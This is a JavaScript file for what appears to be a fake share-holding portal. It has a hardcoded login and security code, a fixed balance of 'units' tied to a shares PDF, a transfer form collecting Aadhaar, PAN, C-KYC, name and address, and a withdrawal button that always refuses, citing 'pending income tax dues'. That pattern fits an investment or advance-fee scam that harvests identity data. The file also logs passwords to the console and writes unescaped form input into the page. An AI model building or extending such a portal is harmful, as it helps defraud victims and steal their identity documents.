// Wait for the DOM to be fully loaded before running the script
document.addEventListener('DOMContentLoaded', () => {
const VALID_USER_ID = "ajaygandhisairavula";
const VALID_PASSWORD = "Nani@9909";

const currentPage = (window.location.pathname.split('/').pop() || '').toLowerCase();

// DOM Elements
const loginView = document.getElementById("loginView");
const homeView = document.getElementById("homeView");
const loginForm = document.getElementById("loginForm");
const loginError = document.getElementById("loginError");
const userIdInput = document.getElementById("userId");
const passwordInput = document.getElementById("password");
const viewDocumentsBtn = document.getElementById("viewDocumentsBtn");
const shareBtn = document.getElementById("shareBtn");
const withdrawalBtn = document.getElementById("withdrawalBtn");
const pdfViewerSection = document.getElementById("pdfViewerSection");
const pdfFrame = document.getElementById("pdfFrame");
const closeViewerBtn = document.getElementById("closeViewerBtn");
const transferForm = document.getElementById("transferForm");
const customAlert = document.getElementById("customAlert");
const alertMessage = document.getElementById("alertMessage");
const alertOkBtn = document.getElementById("alertOkBtn");
const backToHomeBtn = document.getElementById("backToHomeBtn");
const submissionDetails = document.getElementById("submissionDetails");
const closeSuccessBtn = document.getElementById('closeSuccessBtn');
const backToHomeFromDocBtn = document.getElementById('backToHomeFromDocBtn');
const availableUnitsDisplay = document.getElementById('availableUnitsDisplay');

// Available units management
const INITIAL_AVAILABLE_UNITS = 196031;

function getAvailableUnits() {
  const stored = sessionStorage.getItem('availableUnits');
  return stored ? parseInt(stored, 10) : INITIAL_AVAILABLE_UNITS;
}

function setAvailableUnits(units) {
  sessionStorage.setItem('availableUnits', units.toString());
}

function updateAvailableUnitsDisplay() {
  if (availableUnitsDisplay) {
    const units = getAvailableUnits();
    availableUnitsDisplay.textContent = `Available units: ${units.toLocaleString('en-IN')} units`;
  }
}

function subtractUnits(amount) {
  const current = getAvailableUnits();
  const newTotal = current - amount;
  setAvailableUnits(newTotal);
  updateAvailableUnitsDisplay();
  return newTotal;
}

function resetAvailableUnits() {
  sessionStorage.removeItem('availableUnits');
  updateAvailableUnitsDisplay();
}

// Initialize available units display on transfer page
if (currentPage === 'transfer.html') {
  updateAvailableUnitsDisplay();
}

// Custom Alert Function
function showAlert(message) {
  if (!customAlert || !alertMessage) return;
  alertMessage.textContent = message;
  customAlert.classList.add('show');
  document.body.style.overflow = 'hidden';
  
  // Focus the OK button for better accessibility
  setTimeout(() => {
    alertOkBtn?.focus();
  }, 100);
}

// Close alert when clicking OK
alertOkBtn?.addEventListener('click', () => {
  customAlert?.classList.remove('show');
  document.body.style.overflow = '';
});

// Close alert when clicking outside the content
customAlert?.addEventListener('click', (e) => {
  if (e.target === customAlert) {
    customAlert.classList.remove('show');
    document.body.style.overflow = '';
  }
});

// Close alert with Escape key
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && customAlert?.classList.contains('show')) {
    customAlert.classList.remove('show');
    document.body.style.overflow = '';
  }
});

function showHome() {
  if (loginView && homeView) {
    loginView.hidden = true;
    homeView.hidden = false;
    return;
  }
  window.location.href = 'index.html';
}

function showLogin() {
  if (loginView && homeView) {
    homeView.hidden = true;
    loginView.hidden = false;
    return;
  }
  window.location.href = 'index.html';
}

function setLoggedIn(value) {
  if (value) {
    sessionStorage.setItem("isLoggedIn", "true");
  } else {
    sessionStorage.removeItem("isLoggedIn");
    resetAvailableUnits(); // Reset available units on logout
  }
}

function isLoggedIn() {
  return sessionStorage.getItem("isLoggedIn") === "true";
}

if ((currentPage === 'transfer.html' || currentPage === 'success.html' || currentPage === 'document.html') && !isLoggedIn()) {
  window.location.href = 'index.html';
  return;
}

if (loginView && homeView) {
  if (isLoggedIn()) {
    showHome();
  } else {
    showLogin();
  }
}

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  if (loginError) loginError.textContent = "";

  const userId = (userIdInput.value || "").trim();
  const password = passwordInput.value || "";

  console.log("Login attempt with:", { userId, password });

  // Check if fields are not empty
  if (!userId || !password) {
    if (loginError) loginError.textContent = "Please enter both user ID and password";
    return;
  }

  const isAuthenticated = userId === VALID_USER_ID && password === VALID_PASSWORD;

  if (!isAuthenticated) {
    if (loginError) loginError.textContent = "Invalid user ID or password";
    passwordInput.value = "";
    passwordInput.focus();
    setLoggedIn(false);
    return;
  }

  // If we get here, login was successful
  console.log("Login successful, proceeding to home view");
  
  // Set logged in state and show home view
  setLoggedIn(true);
  showHome();
  
  // Clear the form
  loginForm.reset();
  
  // Show welcome message
  showAlert(`Welcome back, ${userId}!`);
});

viewDocumentsBtn?.addEventListener("click", () => {
  window.location.href = 'document.html';
});

closeViewerBtn?.addEventListener("click", () => {
  if (!pdfFrame || !pdfViewerSection) return;
  pdfFrame.src = "";
  pdfViewerSection.hidden = true;
});

if (currentPage === 'document.html' && pdfFrame) {
  const pdfUrl = encodeURI('tata titan shares .pdf');
  pdfFrame.src = pdfUrl;
}

backToHomeFromDocBtn?.addEventListener('click', () => {
  window.location.href = 'index.html';
});

// Function to show security code input dialog
function showSecurityCodeInput(callback) {
  const securityCode = "998990"; // Should come from server in real app
  let attempts = 0;
  const maxAttempts = 3;
  let lockedUntil = 0;

  alertMessage.innerHTML = `
    <div style="margin-bottom: 20px;">
      <p>Please enter the 6-digit security code:</p>
      <input 
        type="password" 
        id="securityCodeInput" 
        class="input"
        maxlength="6"
        pattern="\\d{6}"
        placeholder="Enter code"
        style="width:100%; padding:10px; margin-top:10px; text-align:center;"
      >
      <p id="securityCodeError" class="error" 
         style="color:red; margin-top:5px; display:none;"></p>
    </div>
  `;

  const alertContainer = document.getElementById("customAlert");
  alertContainer.classList.add("show");
  document.body.style.overflow = "hidden";

  setTimeout(() => {
    document.getElementById("securityCodeInput")?.focus();
  }, 100);

  alertOkBtn.onclick = () => {
    const now = Date.now();
    const input = document.getElementById("securityCodeInput");
    const error = document.getElementById("securityCodeError");

    if (now < lockedUntil) {
      const seconds = Math.ceil((lockedUntil - now) / 1000);
      error.style.display = "block";
      error.textContent = `Too many attempts. Try again in ${seconds}s`;
      return;
    }

    if (!/^\d{6}$/.test(input.value)) {
      error.style.display = "block";
      error.textContent = "Enter a valid 6-digit code";
      return;
    }

    if (input.value === securityCode) {
      alertContainer.classList.remove("show");
      document.body.style.overflow = "";
      callback(true);
      return;
    }

    attempts++;
    const remaining = maxAttempts - attempts;

    if (remaining <= 0) {
      lockedUntil = Date.now() + 30000; // lock for 30 seconds
      attempts = 0;
      error.style.display = "block";
      error.textContent = "Too many wrong attempts. Locked for 30 seconds.";
    } else {
      error.style.display = "block";
      error.textContent = `Wrong code. Attempts left: ${remaining}`;
    }

    input.value = "";
    input.focus();
  };

  // Enter key support
  document
    .getElementById("securityCodeInput")
    ?.addEventListener("keypress", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        alertOkBtn.click();
      }
    });
}


 

// Form submission handler for transfer form (transfer.html)
transferForm?.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Get the input value
  const unitsInput = document.getElementById('units');
  const units = parseInt(unitsInput.value, 10);
  
  // Check minimum units requirement
  if (units < 1000) {
    showAlert('Minimum transfer amount is 1,000 units');
    unitsInput.focus();
    return;
  }
  
  // Check form validity
  if (!transferForm.checkValidity()) {
    transferForm.reportValidity();
    return;
  }
  
  // Get form values
  const formData = {
    ckycNo: document.getElementById('ckycNo').value,
    donateNo: document.getElementById('donateNo').value,
    aadharNo: document.getElementById('aadharNo').value,
    address: document.getElementById('address').value,
    pinCode: document.getElementById('pinCode').value,
    fullName: document.getElementById('fullName').value,
    panNo: document.getElementById('panNo').value,
    units: document.getElementById('units').value
  };
  
  // Validate Aadhar number (12 digits)
  if (!/^\d{12}$/.test(formData.aadharNo)) {
    showAlert('Please enter a valid 12-digit Aadhar number');
    return;
  }
  
  // Validate PAN number (10 characters: 5 letters, 4 digits, 1 letter)
  if (!/^[A-Z]{5}[0-9]{4}[A-Z]$/i.test(formData.panNo)) {
    showAlert('Please enter a valid PAN number (e.g., ABCDE1234F)');
    return;
  }
  
  // Validate PIN code (6 digits)
  if (!/^\d{6}$/.test(formData.pinCode)) {
    showAlert('Please enter a valid 6-digit PIN code');
    return;
  }
  
  // Validate units against available units
  const requestedUnits = parseInt(formData.units, 10);
  const availableUnits = getAvailableUnits();
  
  if (isNaN(requestedUnits) || requestedUnits <= 0) {
    showAlert('Please enter a valid number of units');
    return;
  }
  
  if (requestedUnits > availableUnits) {
    showAlert(`Insufficient units! You only have ${availableUnits.toLocaleString('en-IN')} units available. Please enter a smaller amount.`);
    return;
  }
  
  // If all validations pass, redirect to success.html after 5 seconds
  try {
    // Hide the form
    transferForm.hidden = true;
    
    // Show loading message
    showAlert('Processing your submission...');
    
    // Persist data for success page
    sessionStorage.setItem('transferSubmission', JSON.stringify(formData));
    
    // Subtract the units from available units
    const remainingUnits = subtractUnits(requestedUnits);
    console.log(`Successfully transferred ${requestedUnits} units. Remaining: ${remainingUnits}`);

    // Wait 5 seconds before redirecting to success page
    setTimeout(() => {
      customAlert?.classList.remove('show');
      document.body.style.overflow = '';
      window.location.href = 'success.html';
    }, 5000); // 5 second delay
    
  } catch (error) {
    console.error('Error processing form submission:', error);
    showAlert('An error occurred while processing your submission. Please try again.');
    transferForm.hidden = false;
  }
});

// Handle share button click
shareBtn?.addEventListener('click', () => {
  // Show security code input dialog
  showSecurityCodeInput((isValid) => {
    if (isValid) {
      window.location.href = 'transfer.html';
    } else {
      showAlert('Invalid security code. Please try again.');
    }
  });
});

backToHomeBtn?.addEventListener('click', () => {
  window.location.href = 'index.html';
});

if (submissionDetails) {
  const raw = sessionStorage.getItem('transferSubmission');
  let data = null;
  try {
    data = raw ? JSON.parse(raw) : null;
  } catch {
    data = null;
  }

  if (data) {
    const transferredUnits = parseInt(data.units, 10);
    const remainingUnits = getAvailableUnits();
    
    submissionDetails.innerHTML = `
      <p><strong>C-KYC Number:</strong> ${data.ckycNo ?? ''}</p>
      <p><strong>Donation Number:</strong> ${data.donateNo ?? ''}</p>
      <p><strong>Aadhar Number:</strong> ${data.aadharNo ?? ''}</p>
      <p><strong>Name:</strong> ${data.fullName ?? ''}</p>
      <p><strong>PAN Number:</strong> ${data.panNo ?? ''}</p>
      <p><strong>Address:</strong> ${data.address ?? ''}</p>
      <p><strong>Pin Code:</strong> ${data.pinCode ?? ''}</p>
      <p><strong>Units Transferred:</strong> ${transferredUnits.toLocaleString('en-IN')}</p>
      <p><strong>Remaining Units:</strong> ${remainingUnits.toLocaleString('en-IN')}</p>
    `;
  }
}

closeSuccessBtn?.addEventListener('click', () => {
  sessionStorage.removeItem('transferSubmission');
  window.location.href = 'index.html';
});

// Handle withdrawal button click
withdrawalBtn?.addEventListener('click', () => {
  // Create error popup content
  alertMessage.innerHTML = `
    <div class="error-container">
      <div class="error-animation">
        <div class="wrong-mark">✕</div>
      </div>
      <h3>Sorry, you are not eligible for withdrawal due to pending income tax dues.</h3>
    </div>
  `;
  
  // Show the alert with error content
  const alertContainer = document.getElementById('customAlert');
  if (!alertContainer) return;
  alertContainer.classList.add('show');
  document.body.style.overflow = 'hidden';
  
  // Focus the OK button
  setTimeout(() => {
    alertOkBtn?.focus();
  }, 100);
});

// Close the DOMContentLoaded event listener
});